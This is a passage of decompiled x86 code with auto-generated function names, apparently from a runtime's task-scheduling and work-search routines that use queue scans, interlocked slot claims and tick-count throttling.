  v3 = v2 - 1;
  if ( !v3 )
  {
    v6 = *(_DWORD *)(*(_DWORD *)(this + 12) + 44);
    return v6 == a2[2];
  }
  v4 = v3 - 1;
  if ( !v4 )
  {
    v6 = *(_DWORD *)(this + 8);
    return v6 == a2[2];
  }
  return v4 == 1 && sub_481D6A(*(unsigned int **)(this + 12), a2[2]);
}

//----- (00481DDF) --------------------------------------------------------
bool __thiscall sub_481DDF(_DWORD *this, _DWORD *a2)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v6; // eax

  v2 = *a2 & 0xFFFFFFF;
  if ( !v2 )
    return 1;
  v3 = v2 - 1;
  if ( v3 )
  {
    v4 = v3 - 1;
    if ( v4 )
    {
      if ( v4 != 1 )
        return 0;
      v6 = this[2];
    }
    else
    {
      v6 = *(_DWORD *)(*(_DWORD *)(this[3] + 80) + 48);
    }
  }
  else
  {
    v6 = *(_DWORD *)(*(_DWORD *)(this[3] + 80) + 44);
  }
  return v6 == a2[2];
}

//----- (00481E2B) --------------------------------------------------------
_DWORD *__thiscall sub_481E2B(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  *this = 1;
  this[1] = sub_406D60((_DWORD *)(a2 + 4));
  result = this;
  this[2] = a2;
  return result;
}

//----- (00481E51) --------------------------------------------------------
unsigned __int32 __thiscall sub_481E51(_DWORD *this, int a2)
{
  unsigned __int32 v3; // edx
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  if ( *(_DWORD *)((a2 << 7) + this[23]) <= 1u )
    return 0;
  savedregs = (int)&savedregs;
  v3 = *(_DWORD *)((a2 << 7) + this[23]);
  if ( v3 > 1 && v3 == _InterlockedCompareExchange((volatile signed __int32 *)((a2 << 7) + this[23]), 1, v3) )
    return v3;
  else
    return 0;
}

//----- (00481EA2) --------------------------------------------------------
int __thiscall sub_481EA2(int *this)
{
  int v3; // eax

  if ( (*(_BYTE *)this & 0x18) != 0 && !sub_482513(this) )
    return 0;
  if ( *this == 2 )
  {
    v3 = sub_47F9F2((_DWORD *)this[1], this[2], 0);
LABEL_8:
    this[2] = v3;
    if ( v3 )
    {
      *(_BYTE *)(v3 + 179) |= 1u;
      *this = 1;
    }
    return this[2];
  }
  if ( *this == 4 )
  {
    v3 = sub_47F9F2((_DWORD *)this[1], this[2], 1);
    goto LABEL_8;
  }
  return this[2];
}

//----- (00481EEF) --------------------------------------------------------
int __thiscall sub_481EEF(_DWORD *this, int a2)
{
  int result; // eax

  if ( *this == 2 )
  {
    result = sub_47E2E2(a2, this[1], this[2], 0);
  }
  else
  {
    result = *this - 4;
    if ( *this == 4 )
      result = sub_47E2E2(a2, this[1], this[2], 1);
  }
  this[2] = a2;
  *this = 1;
  return result;
}

//----- (00481F29) --------------------------------------------------------
char __thiscall sub_481F29(_QWORD *this, __int64 a2)
{
  char result; // al

  if ( (unsigned __int64)(a2 - this[3]) <= 0x3E8 )
    return 0;
  result = 1;
  this[3] = a2;
  return result;
}

//----- (00481F5F) --------------------------------------------------------
char __thiscall sub_481F5F(_DWORD *this, _DWORD *a2, int *a3, char a4)
{
  int v5; // eax
  _DWORD *v6; // eax
  int v8; // eax
  _DWORD *v9; // eax
  int v10[3]; // [esp+Ch] [ebp-18h] BYREF
  int v11[3]; // [esp+18h] [ebp-Ch] BYREF

  if ( !a4 )
  {
    if ( this[3] < 0x65u )
    {
      if ( a3[5] - a3[4] <= 0 )
        v8 = 0;
      else
        v8 = sub_47C94D(a3 + 4);
    }
    else
    {
      if ( this[3] >= 0x7Fu )
      {
LABEL_16:
        this[3] = 0;
        return 0;
      }
      v8 = sub_483341(a3);
    }
    if ( v8 )
    {
      v9 = sub_481E2B(v10, v8);
      *a2 = *v9;
      a2[1] = v9[1];
      a2[2] = v9[2];
      ++this[3];
      return 1;
    }
    goto LABEL_16;
  }
  if ( a3[5] - a3[4] <= 0 )
    v5 = 0;
  else
    v5 = sub_47C94D(a3 + 4);
  if ( v5 )
  {
    v6 = sub_481E2B(v11, v5);
    *a2 = *v6;
    a2[1] = v6[1];
    a2[2] = v6[2];
    return 1;
  }
  return 0;
}
// 481F5F: using guessed type int var_C[3];
// 481F5F: using guessed type int var_18[3];

//----- (00481FF6) --------------------------------------------------------
int __thiscall sub_481FF6(_DWORD *this, int *a2, int a3)
{
  int v3; // edi
  int i; // esi
  int v5; // edx
  int result; // eax

  v3 = this[11];
  for ( i = 0; i < v3; ++i )
  {
    v5 = (i + *a2 + (a3 != -1)) % v3;
    if ( v5 == a3 )
      break;
    result = *(_DWORD *)(this[8] + 4 * v5);
    if ( result )
    {
      *a2 = v5;
      return result;
    }
  }
  return 0;
}

//----- (00482043) --------------------------------------------------------
int __thiscall sub_482043(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // ebx
  int v3; // edi
  int result; // eax

  v2 = this + 4;
  v3 = this[44];
  result = sub_47528F(v3, this[20], a2, this + 4);
  if ( !result )
  {
    if ( v3 )
      return sub_47528F(0, v3, a2, v2);
  }
  return result;
}

//----- (0048207E) --------------------------------------------------------
int __thiscall sub_48207E(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // ebx
  int v3; // edi
  int result; // eax

  v2 = this + 24;
  v3 = this[45];
  result = sub_47528F(v3, this[40], a2, this + 24);
  if ( !result )
  {
    if ( v3 )
      return sub_47528F(0, v3, a2, v2);
  }
  return result;
}

//----- (004820BC) --------------------------------------------------------
char __stdcall sub_4820BC(int *a1, int *a2, char a3)
{
  int v3; // eax
  char result; // al
  int v5; // [esp+8h] [ebp-Ch]
  int v6; // [esp+10h] [ebp-4h]

  if ( a3 )
  {
    v3 = sub_47FA25(a2);
    if ( v3 )
    {
      v5 = 2;
      v6 = v3;
LABEL_4:
      result = 1;
      *a1 = v5;
      a1[1] = (int)a2;
      a1[2] = v6;
      return result;
    }
  }
  else if ( sub_47FA7F(a2) )
  {
    v5 = 8;
    goto LABEL_4;
  }
  return 0;
}
// 4820EF: variable 'v6' is possibly undefined

//----- (0048210C) --------------------------------------------------------
char __thiscall sub_48210C(_DWORD *this, int *a2, int *a3, char a4, int a5, char a6)
{
  int v6; // esi
  int *v8; // esi

  v6 = a3[64];
  if ( !sub_483204(this, (int)a3, 0, a5, a6) && sub_4820BC(a2, a3, a4) )
    return 1;
  if ( a5 )
    v8 = *(int **)(v6 + 12);
  else
    v8 = *(int **)(v6 + 16);
  while ( v8 )
  {
    if ( !sub_483204(this, (int)v8, (int)a3, a5, a6) && sub_4820BC(a2, v8, a4) )
      return 1;
    v8 = (int *)v8[65];
  }
  return 0;
}

//----- (0048218D) --------------------------------------------------------
char __stdcall sub_48218D(_DWORD *a1, int a2)
{
  int v2; // eax
  _DWORD *v3; // esi
  char result; // al
  int v5[3]; // [esp+8h] [ebp-Ch] BYREF

  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 12))(a2);
  if ( !v2 )
    return 0;
  v3 = sub_481E2B(v5, v2);
  result = 1;
  *a1 = *v3++;
  a1[1] = *v3;
  a1[2] = v3[1];
  return result;
}
// 48218D: using guessed type int var_C[3];

//----- (004821CA) --------------------------------------------------------
char __thiscall sub_4821CA(_DWORD *this, _DWORD *a2, int a3, int a4, char a5)
{
  int v5; // esi
  int v7; // esi

  v5 = *(_DWORD *)(a3 + 256);
  if ( !sub_483204(this, a3, 0, a4, a5) && sub_48218D(a2, a3) )
    return 1;
  if ( a4 )
    v7 = *(_DWORD *)(v5 + 12);
  else
    v7 = *(_DWORD *)(v5 + 16);
  while ( v7 )
  {
    if ( !sub_483204(this, v7, a3, a4, a5) && sub_48218D(a2, v7) )
      return 1;
    v7 = *(_DWORD *)(v7 + 260);
  }
  return 0;
}

//----- (00482245) --------------------------------------------------------
char __stdcall sub_482245(int *a1, int a2, char a3, char a4)
{
  void *v4; // eax
  char result; // al
  int v6; // [esp+8h] [ebp-Ch]
  int v7; // [esp+10h] [ebp-4h]

  if ( a4 )
  {
    v4 = sub_4800C2(a2, a3);
    if ( v4 )
    {
      v6 = 4;
LABEL_4:
      v7 = (int)v4;
      result = 1;
      *a1 = v6;
      a1[1] = a2;
      a1[2] = v7;
      return result;
    }
  }
  else
  {
    v4 = sub_47FC89(a2);
    if ( v4 )
    {
      v6 = 16;
      goto LABEL_4;
    }
  }
  return 0;
}

//----- (00482298) --------------------------------------------------------
char __thiscall sub_482298(_DWORD *this, int *a2, int a3, char a4, int a5, char a6)
{
  int v7; // esi
  int v9; // [esp+8h] [ebp-4h]

  v9 = *(_DWORD *)(a3 + 256);
  if ( !sub_483204(this, a3, 0, a5, a6) && sub_482245(a2, a3, a6, a4) )
    return 1;
  if ( a5 )
    v7 = *(_DWORD *)(v9 + 12);
  else
    v7 = *(_DWORD *)(v9 + 16);
  while ( v7 )
  {
    if ( !sub_483204(this, v7, a3, a5, a6) && sub_482245(a2, v7, a6, a4) )
      return 1;
    v7 = *(_DWORD *)(v7 + 260);
  }
  return 0;
}

//----- (00482326) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_482326(_DWORD *this)
{
  PSLIST_ENTRY result; // eax

  if ( *this == 2 )
  {
    sub_4833A3(this[2]);
    return sub_47696E(*(_DWORD *)(*(_DWORD *)(this[1] + 256) + 4), this[2]);
  }
  else
  {
    result = (PSLIST_ENTRY)(*this - 4);
    if ( *this == 4 )
      return (PSLIST_ENTRY)(*(int (__cdecl **)(_DWORD))(this[2] + 12))(this[2]);
  }
  return result;
}

//----- (00482369) --------------------------------------------------------
void __thiscall sub_482369(int this, signed __int64 a2)
{
  if ( (unsigned __int64)(a2 - *(_QWORD *)(this + 416)) > 0x7D0 )
    sub_4763B9((_DWORD *)this, a2);
}

//----- (004823A2) --------------------------------------------------------
char __thiscall sub_4823A2(_DWORD *this, _DWORD *a2)
{
  int v2; // eax
  _DWORD *v3; // esi
  char result; // al
  int v5[3]; // [esp+8h] [ebp-Ch] BYREF

  v2 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*this + 8))(*this);
  if ( !v2 )
    return 0;
  v3 = sub_481E2B(v5, v2);
  result = 1;
  *a2 = *v3++;
  a2[1] = *v3;
  a2[2] = v3[1];
  return result;
}
// 4823A2: using guessed type int var_C[3];

//----- (004823DE) --------------------------------------------------------
bool __stdcall sub_4823DE(int *a1, int *a2, char a3, char a4)
{
  return (a4 & 1) != 0 && sub_48218D(a2, (int)a1)
      || (a4 & 0xA) != 0 && sub_4820BC(a2, a1, (a4 & 2) != 0)
      || (a4 & 0x14) != 0 && sub_482245(a2, (int)a1, a3, (a4 & 4) != 0);
}

//----- (0048244B) --------------------------------------------------------
bool __stdcall sub_48244B(int *a1, int *a2, char a3, char a4)
{
  return (a4 & 0x14) != 0 && sub_482245(a2, (int)a1, a3, (a4 & 4) != 0)
      || (a4 & 0xA) != 0 && sub_4820BC(a2, a1, (a4 & 2) != 0)
      || (a4 & 1) != 0 && sub_48218D(a2, (int)a1);
}

//----- (004824B9) --------------------------------------------------------
__int64 __thiscall sub_4824B9(_DWORD *this, int a2, int a3)
{
  __int64 result; // rax

  this[3] = 0;
  *this = a2;
  this[2] = *(_DWORD *)(a2 + 144);
  this[1] = **(_DWORD **)(a2 + 80);
  result = j____crtGetTickCount64();
  *((_QWORD *)this + 3) = result;
  *((_QWORD *)this + 2) = result;
  if ( a3 == 1 )
  {
    this[8] = sub_482592;
    this[9] = sub_482859;
  }
  else
  {
    this[8] = sub_482DEA;
    this[9] = sub_482EFD;
  }
  return result;
}
// 46F7CA: using guessed type __int64 j____crtGetTickCount64(void);

//----- (00482513) --------------------------------------------------------
bool __thiscall sub_482513(void *this)
{
  volatile __int32 *v2; // ecx
  char v3; // al
  int v4; // edi
  int v5; // eax
  _BYTE *v7; // [esp+8h] [ebp-4h] BYREF

  if ( *(_DWORD *)this == 8 )
  {
    v5 = sub_47FA25(*((int **)this + 1));
    if ( !v5 )
      return (*(_DWORD *)this & 0x18) == 0;
    *(_DWORD *)this = 2;
    goto LABEL_10;
  }
  if ( *(_DWORD *)this != 16 )
    return (*(_DWORD *)this & 0x18) == 0;
  v2 = (volatile __int32 *)*((_DWORD *)this + 2);
  if ( v2 != (volatile __int32 *)1 )
  {
    v5 = sub_480EBA(v2, 0);
    if ( !v5 )
      return (*(_DWORD *)this & 0x18) == 0;
    *(_DWORD *)this = 4;
LABEL_10:
    *((_DWORD *)this + 2) = v5;
    return (*(_DWORD *)this & 0x18) == 0;
  }
  v3 = sub_47F7C9((volatile signed __int32 *)(*((_DWORD *)this + 1) + 52), &v7);
  v4 = v3 != 0 ? (unsigned int)v7 : 0;
  if ( v4 )
  {
    sub_481272(v3 != 0 ? v7 : 0, 1);
    *((_DWORD *)this + 2) = v4;
    *(_DWORD *)this = 4;
  }
  return (*(_DWORD *)this & 0x18) == 0;
}

//----- (00482592) --------------------------------------------------------
char __thiscall sub_482592(int this, int *a2, int *a3, char a4, char a5)
{
  int *v5; // edi
  char result; // al
  signed __int64 TickCount64; // rax
  int v9; // ecx
  int v10; // ecx
  __int32 v11; // eax
  _DWORD *v12; // eax
  int *v13; // eax
  int v14; // ecx
  bool v15; // zf
  int v16; // esi
  int *v17; // eax
  _DWORD *v18; // esi
  int v19; // edi
  _DWORD *v20; // esi
  int *v21; // [esp+10h] [ebp-28h]
  int v22; // [esp+14h] [ebp-24h]
  char v23; // [esp+18h] [ebp-20h]
  bool v24; // [esp+18h] [ebp-20h]
  int v25; // [esp+1Ch] [ebp-1Ch]
  char v26; // [esp+23h] [ebp-15h]
  int v27; // [esp+24h] [ebp-14h] BYREF
  int v28[3]; // [esp+28h] [ebp-10h] BYREF

  v5 = a2;
  v26 = 0;
  if ( sub_4823A2((_DWORD *)this, a2) )
    return 1;
  TickCount64 = j____crtGetTickCount64();
  v9 = *(_DWORD *)(this + 4);
  *(_QWORD *)(this + 16) = TickCount64;
  sub_482369(v9, TickCount64);
  if ( sub_481F29((_QWORD *)this, *(_QWORD *)(this + 16)) )
  {
    v10 = *(_DWORD *)(this + 4);
    if ( *(_DWORD *)(v10 + 304) )
    {
      while ( 1 )
      {
        v12 = (_DWORD *)sub_4757E8(v10);
        if ( !v12 )
          break;
        if ( *v12 )
        {
          if ( (a5 & 1) != 0 )
          {
            v11 = sub_483341(v12 - 53);
            if ( v11 )
            {
              v13 = sub_481E2B(v28, v11);
              *a2 = *v13;
              a2[1] = v13[1];
              a2[2] = v13[2];
              v5 = a2;
LABEL_15:
              v26 = 1;
              break;
            }
          }
        }
        else if ( sub_4823DE(v12 - 68, a2, a4, a5) )
        {
          goto LABEL_15;
        }
        v10 = *(_DWORD *)(this + 4);
      }
    }
    *(_BYTE *)(*(_DWORD *)this + 98) = 1;
  }
  v14 = *(_DWORD *)this;
  v22 = *(_DWORD *)(*(_DWORD *)this + 84);
  if ( v26 )
    goto LABEL_44;
  v28[1] = 0;
  v15 = *(_BYTE *)(v14 + 96) == 0;
  v28[0] = 1;
  v28[2] = 2;
  v16 = v15 && !sub_47C3DF(v14) && !a4;
  result = 0;
  v23 = 1;
  do
  {
    if ( v16 > 2 )
      break;
    v21 = a3;
    v25 = v22;
    if ( v22 )
    {
      while ( 1 )
      {
        v17 = (int *)sub_481E51(*(_DWORD **)(this + 4), *(_DWORD *)(this + 8));
        if ( v17 )
        {
          if ( sub_4823DE(v17, v5, a4, a5) )
            break;
        }
        if ( v23 && (a5 & 1) != 0 && sub_481F5F((_DWORD *)this, v5, *(int **)this, 0)
          || (a5 & 1) != 0 && sub_482BDD(this, v5, (_DWORD *)v25, (int)v21, v23, v28[v16], a5, a4)
          || (a5 & 0xA) != 0 && sub_482AE1(this, v5, (_DWORD *)v25, v21, (a5 & 2) != 0, v28[v16], a5, a4)
          || (a5 & 0x14) != 0 && sub_482CEB(this, v5, (_DWORD *)v25, (int)v21, (a5 & 4) != 0, v28[v16], a5, a4)
          || (a5 & 1) != 0 && v16 == 2 && sub_4832D2(this, v5, *(_DWORD **)(v25 + 4), *(int **)this) )
        {
          break;
        }
        v21 = 0;
        v23 = 0;
        v25 = sub_475859(*(_DWORD **)(this + 4), v22, v25);
        if ( !v25 )
        {
          result = v26;
          goto LABEL_42;
        }
      }
      result = 1;
      v26 = 1;
    }
LABEL_42:
    ++v16;
  }
  while ( !result );
  if ( result )
  {
LABEL_44:
    v18 = (_DWORD *)v5[1];
    v19 = v18[2];
    sub_4831B8(v18, *(_DWORD *)(this + 16), *(_DWORD *)(this + 20));
    v20 = v18 + 3;
    v24 = 0;
    if ( (*v20 & 0xFFFFFFF) != 0 )
    {
      sub_4777A9(&v27, (_DWORD *)(*(_DWORD *)this + 148));
      v24 = sub_481DDF(&v27, v20);
    }
    sub_47CE13(*(_DWORD *)this, v24, v19 == v22);
    return v26;
  }
  return result;
}
// 46F7CA: using guessed type __int64 j____crtGetTickCount64(void);

//----- (00482859) --------------------------------------------------------
char __thiscall sub_482859(int this, int *a2, int *a3, char a4, char a5)
{
  int *v5; // edi
  char result; // al
  signed __int64 TickCount64; // rax
  int v9; // ecx
  int v10; // ecx
  __int32 v11; // eax
  _DWORD *v12; // eax
  int *v13; // eax
  int v14; // ecx
  bool v15; // zf
  int v16; // esi
  _DWORD *v17; // edx
  int *v18; // ecx
  int i; // eax
  int v20; // eax
  _DWORD *v21; // ecx
  int v22; // esi
  char v23; // [esp+10h] [ebp-28h]
  int v24; // [esp+18h] [ebp-20h]
  int v25; // [esp+1Ch] [ebp-1Ch]
  int v26; // [esp+20h] [ebp-18h]
  char v27; // [esp+27h] [ebp-11h]
  int v28[3]; // [esp+28h] [ebp-10h] BYREF

  v5 = a2;
  v27 = 0;
  if ( sub_4823A2((_DWORD *)this, a2) )
    return 1;
  TickCount64 = j____crtGetTickCount64();
  v9 = *(_DWORD *)(this + 4);
  *(_QWORD *)(this + 16) = TickCount64;
  sub_482369(v9, TickCount64);
  if ( sub_481F29((_QWORD *)this, *(_QWORD *)(this + 16)) )
  {
    v10 = *(_DWORD *)(this + 4);
    if ( *(_DWORD *)(v10 + 304) )
    {
      while ( 1 )
      {
        v12 = (_DWORD *)sub_4757E8(v10);
        if ( !v12 )
          break;
        if ( *v12 )
        {
          if ( (a5 & 1) != 0 )
          {
            v11 = sub_483341(v12 - 53);
            if ( v11 )
            {
              v13 = sub_481E2B(v28, v11);
              *a2 = *v13;
              a2[1] = v13[1];
              a2[2] = v13[2];
              v5 = a2;
LABEL_15:
              v27 = 1;
              break;
            }
          }
        }
        else if ( sub_48244B(v12 - 68, a2, a4, a5) )
        {
          goto LABEL_15;
        }
        v10 = *(_DWORD *)(this + 4);
      }
    }
    *(_BYTE *)(*(_DWORD *)this + 98) = 1;
  }
  v14 = *(_DWORD *)this;
  v24 = *(_DWORD *)(*(_DWORD *)this + 84);
  if ( v27 )
    goto LABEL_48;
  v28[1] = 0;
  v15 = *(_BYTE *)(v14 + 96) == 0;
  v28[0] = 1;
  v28[2] = 2;
  v16 = v15 && !sub_47C3DF(v14) && !a4;
  result = 0;
  v23 = 1;
  do
  {
    if ( v16 > 2 )
      break;
    v17 = (_DWORD *)v24;
    v18 = a3;
    v25 = (int)a3;
    v26 = v24;
    if ( v24 )
    {
      for ( i = a5 & 0x14; ; i = a5 & 0x14 )
      {
        if ( i )
        {
          if ( sub_482CEB(this, v5, v17, (int)v18, (a5 & 4) != 0, v28[v16], a5, a4) )
            goto LABEL_44;
          v18 = (int *)v25;
          v17 = (_DWORD *)v26;
        }
        if ( (a5 & 0xA) != 0 && sub_482AE1(this, v5, v17, v18, (a5 & 2) != 0, v28[v16], a5, a4) )
          goto LABEL_44;
        v20 = a5 & 1;
        if ( (a5 & 1) != 0 )
        {
          if ( sub_482BDD(this, v5, (_DWORD *)v26, v25, v23, v28[v16], a5, a4) )
            goto LABEL_44;
          v20 = a5 & 1;
        }
        if ( v20 && v16 == 2 )
        {
          if ( sub_4832D2(this, v5, *(_DWORD **)(v26 + 4), *(int **)this) )
            goto LABEL_44;
          v20 = a5 & 1;
        }
        if ( v23 && v20 && sub_481F5F((_DWORD *)this, v5, *(int **)this, 1) )
        {
LABEL_44:
          result = 1;
          v27 = 1;
          goto LABEL_46;
        }
        v23 = 0;
        v25 = 0;
        v17 = (_DWORD *)sub_475859(*(_DWORD **)(this + 4), v24, v26);
        v26 = (int)v17;
        if ( !v17 )
          break;
        v18 = 0;
      }
      result = v27;
    }
LABEL_46:
    ++v16;
  }
  while ( !result );
  if ( result )
  {
LABEL_48:
    v21 = (_DWORD *)v5[1];
    v22 = v21[2];
    sub_4831B8(v21, *(_DWORD *)(this + 16), *(_DWORD *)(this + 20));
    sub_47CE13(*(_DWORD *)this, (*(_DWORD *)(v5[1] + 12) & 0xFFFFFFF) == 0, v22 == v24);
    return v27;
  }
  return result;
}
// 46F7CA: using guessed type __int64 j____crtGetTickCount64(void);

//----- (00482AE1) --------------------------------------------------------
char __thiscall sub_482AE1(int this, int *a2, _DWORD *a3, int *a4, char a5, int a6, char a7, char a8)
{
  int v8; // eax
  int *v9; // ebx
  int *v10; // eax
  int i; // [esp+Ch] [ebp-Ch]
  int v14; // [esp+14h] [ebp-4h] BYREF

  if ( !a4 || !sub_48210C((_DWORD *)this, a2, a4, a5, a6, a8) )
  {
    if ( a6 )
      v8 = sub_482043(a3, &v14);
    else
      v8 = sub_48207E(a3, &v14);
    v9 = (int *)v8;
    for ( i = v14; ; v9 = (int *)sub_47581D(&v14, i, (_DWORD *)((char *)a3 + (a6 != 0 ? 16 : 96))) )
    {
      if ( !v9 )
        return 0;
      v10 = (int *)sub_481E51(*(_DWORD **)(this + 4), *(_DWORD *)(this + 8));
      if ( v10 && sub_4823DE(v10, a2, a8, a7) )
        return 1;
      if ( !sub_483204((_DWORD *)this, (int)v9, (int)a4, a6, a8) && sub_4820BC(a2, v9, a5) )
        break;
    }
    if ( a6 )
      a3[44] = (v14 + 1) % a3[20];
    else
      a3[45] = (v14 + 1) % a3[40];
  }
  return 1;
}

//----- (00482BDD) --------------------------------------------------------
char __thiscall sub_482BDD(int this, int *a2, _DWORD *a3, int a4, char a5, int a6, char a7, char a8)
{
  int v9; // eax
  int *v10; // eax
  int i; // [esp+Ch] [ebp-Ch]
  int v13; // [esp+10h] [ebp-8h]
  int v14; // [esp+14h] [ebp-4h] BYREF

  if ( (!a4 || !sub_4821CA((_DWORD *)this, a2, a4, a6, a8))
    && (!a5 || !sub_4832D2(this, a2, *(_DWORD **)(*(_DWORD *)this + 80), *(int **)this)) )
  {
    if ( a6 )
      v9 = sub_482043(a3, &v14);
    else
      v9 = sub_48207E(a3, &v14);
    for ( i = v14; ; v9 = sub_47581D(&v14, i, (_DWORD *)((char *)a3 + (a6 != 0 ? 16 : 96))) )
    {
      v13 = v9;
      if ( !v9 )
        return 0;
      v10 = (int *)sub_481E51(*(_DWORD **)(this + 4), *(_DWORD *)(this + 8));
      if ( v10 && sub_4823DE(v10, a2, a8, a7) )
        return 1;
      if ( !sub_483204((_DWORD *)this, v13, a4, a6, a8) && sub_48218D(a2, v13) )
        break;
    }
    if ( a6 )
      a3[44] = (v14 + 1) % a3[20];
    else
      a3[45] = (v14 + 1) % a3[40];
  }
  return 1;
}

//----- (00482CEB) --------------------------------------------------------
char __thiscall sub_482CEB(int this, int *a2, _DWORD *a3, int a4, char a5, int a6, char a7, char a8)
{
  int v8; // eax
  int v9; // ebx
  int *v10; // eax
  int i; // [esp+Ch] [ebp-Ch]
  int v14; // [esp+14h] [ebp-4h] BYREF

  if ( !a4 || !sub_482298((_DWORD *)this, a2, a4, a5, a6, a8) )
  {
    if ( a6 )
      v8 = sub_482043(a3, &v14);
    else
      v8 = sub_48207E(a3, &v14);
    v9 = v8;
    for ( i = v14; ; v9 = sub_47581D(&v14, i, (_DWORD *)((char *)a3 + (a6 != 0 ? 16 : 96))) )
    {
      if ( !v9 )
        return 0;
      v10 = (int *)sub_481E51(*(_DWORD **)(this + 4), *(_DWORD *)(this + 8));
      if ( v10 && sub_4823DE(v10, a2, a8, a7) )
        return 1;
      if ( !sub_483204((_DWORD *)this, v9, a4, a6, a8) && sub_482245(a2, v9, a8, a5) )
        break;
    }
    if ( a6 )
      a3[44] = (v14 + 1) % a3[20];
    else
      a3[45] = (v14 + 1) % a3[40];
  }
  return 1;
}

//----- (00482DEA) --------------------------------------------------------
char __thiscall sub_482DEA(int this, int *a2, int a3, int a4, unsigned int a5)
{
  char v6; // bl
  int v8; // esi
  unsigned int v9; // eax
  _DWORD *v10; // eax
  char v11; // al
  _DWORD *v12; // ecx
  _DWORD *v13; // ecx
  unsigned int v14; // eax
  char v15; // al
  _DWORD *v16; // ecx
  unsigned int v17; // eax
  char v18; // al
  int v19; // [esp-8h] [ebp-18h]
  char v20; // [esp+8h] [ebp-8h]
  char v21; // [esp+8h] [ebp-8h]
  int v22; // [esp+Ch] [ebp-4h]
  int v23; // [esp+Ch] [ebp-4h]
  int v24; // [esp+Ch] [ebp-4h]

  v6 = 0;
  if ( sub_4823A2((_DWORD *)this, a2) )
    return 1;
  v8 = sub_475884(*(_DWORD **)(this + 4));
  v9 = a5;
  if ( (a5 & 1) == 0 )
  {
LABEL_9:
    if ( (v9 & 0xA) != 0 && (v13 = (_DWORD *)v8, (v23 = v8) != 0) )
    {
      v14 = (v9 >> 1) & 0xFFFFFF01;
      v20 = v14;
      while ( 1 )
      {
        v15 = sub_48300B(a2, v13, v14);
        v12 = *(_DWORD **)(this + 4);
        v6 = v15;
        v19 = v23;
        if ( v15 )
          break;
        v13 = (_DWORD *)sub_475859(v12, v8, v23);
        v23 = (int)v13;
        LOBYTE(v14) = v20;
        if ( !v13 )
        {
          v9 = a5;
          goto LABEL_15;
        }
      }
    }
    else
    {
LABEL_15:
      if ( (v9 & 0x14) == 0 )
        return v6;
      v16 = (_DWORD *)v8;
      v24 = v8;
      if ( !v8 )
        return v6;
      v17 = (v9 >> 2) & 0xFFFFFF01;
      v21 = v17;
      while ( 1 )
      {
        v18 = sub_483120(a2, v16, v17);
        v12 = *(_DWORD **)(this + 4);
        v6 = v18;
        v19 = v24;
        if ( v18 )
          break;
        v16 = (_DWORD *)sub_475859(v12, v8, v24);
        v24 = (int)v16;
        LOBYTE(v17) = v21;
        if ( !v16 )
          return v6;
      }
    }
    goto LABEL_21;
  }
  v22 = v8;
  v10 = (_DWORD *)v8;
  if ( v8 )
  {
    while ( 1 )
    {
      v11 = sub_48309F(a2, v10);
      v12 = *(_DWORD **)(this + 4);
      v6 = v11;
      v19 = v22;
      if ( v11 )
        break;
      v10 = (_DWORD *)sub_475859(v12, v8, v22);
      v22 = (int)v10;
      if ( !v10 )
        goto LABEL_7;
    }
LABEL_21:
    sub_476F9C(v12, v19);
    return v6;
  }
LABEL_7:
  v6 = sub_483290((_DWORD **)this, a2, *(_DWORD **)(*(_DWORD *)this + 80));
  if ( !v6 )
  {
    v9 = a5;
    goto LABEL_9;
  }
  return v6;
}

//----- (00482EFD) --------------------------------------------------------
char __thiscall sub_482EFD(int this, int *a2, int a3, int a4, unsigned int a5)
{
  char v6; // bl
  int v8; // eax
  int v9; // esi
  _DWORD *v10; // ecx
  unsigned int v11; // eax
  char v12; // al
  _DWORD *v13; // ecx
  _DWORD *v14; // ecx
  unsigned int v15; // eax
  char v16; // al
  _DWORD *v17; // eax
  char v18; // al
  int v19; // [esp-8h] [ebp-18h]
  char v20; // [esp+8h] [ebp-8h]
  char v21; // [esp+8h] [ebp-8h]
  int v22; // [esp+Ch] [ebp-4h]
  int v23; // [esp+Ch] [ebp-4h]
  int v24; // [esp+Ch] [ebp-4h]

  v6 = 0;
  if ( sub_4823A2((_DWORD *)this, a2) )
    return 1;
  v8 = sub_475884(*(_DWORD **)(this + 4));
  v9 = v8;
  if ( (a5 & 0x14) != 0 )
  {
    v10 = (_DWORD *)v8;
    v22 = v8;
    if ( v8 )
    {
      v11 = (a5 >> 2) & 0xFFFFFF01;
      v20 = v11;
      do
      {
        v12 = sub_483120(a2, v10, v11);
        v13 = *(_DWORD **)(this + 4);
        v6 = v12;
        v19 = v22;
        if ( v12 )
          goto LABEL_19;
        v10 = (_DWORD *)sub_475859(v13, v9, v22);
        v22 = (int)v10;
        LOBYTE(v11) = v20;
      }
      while ( v10 );
    }
  }
  if ( (a5 & 0xA) != 0 )
  {
    v14 = (_DWORD *)v9;
    v23 = v9;
    if ( v9 )
    {
      v15 = (a5 >> 1) & 0xFFFFFF01;
      v21 = v15;
      do
      {
        v16 = sub_48300B(a2, v14, v15);
        v13 = *(_DWORD **)(this + 4);
        v6 = v16;
        v19 = v23;
        if ( v16 )
          goto LABEL_19;
        v14 = (_DWORD *)sub_475859(v13, v9, v23);
        v23 = (int)v14;
        LOBYTE(v15) = v21;
      }
      while ( v14 );
    }
  }
  if ( (a5 & 1) != 0 )
  {
    v24 = v9;
    v17 = (_DWORD *)v9;
    if ( v9 )
    {
      while ( 1 )
      {
        v18 = sub_48309F(a2, v17);
        v13 = *(_DWORD **)(this + 4);
        v6 = v18;
        v19 = v24;
        if ( v18 )
          break;
        v17 = (_DWORD *)sub_475859(v13, v9, v24);
        v24 = (int)v17;
        if ( !v17 )
          return sub_483290((_DWORD **)this, a2, *(_DWORD **)(*(_DWORD *)this + 80));
      }
LABEL_19:
      sub_476F9C(v13, v19);
      return v6;
    }
    return sub_483290((_DWORD **)this, a2, *(_DWORD **)(*(_DWORD *)this + 80));
  }
  return v6;
}

//----- (0048300B) --------------------------------------------------------
char __stdcall sub_48300B(int *a1, _DWORD *a2, char a3)
{
  int *v3; // esi
  int v4; // eax
  char result; // al
  int v6; // [esp+Ch] [ebp-14h]
  int v7; // [esp+14h] [ebp-Ch]
  int v8; // [esp+18h] [ebp-8h]
  int v9; // [esp+1Ch] [ebp-4h] BYREF

  v3 = (int *)sub_48207E(a2, &v9);
  v8 = v9;
  while ( v3 )
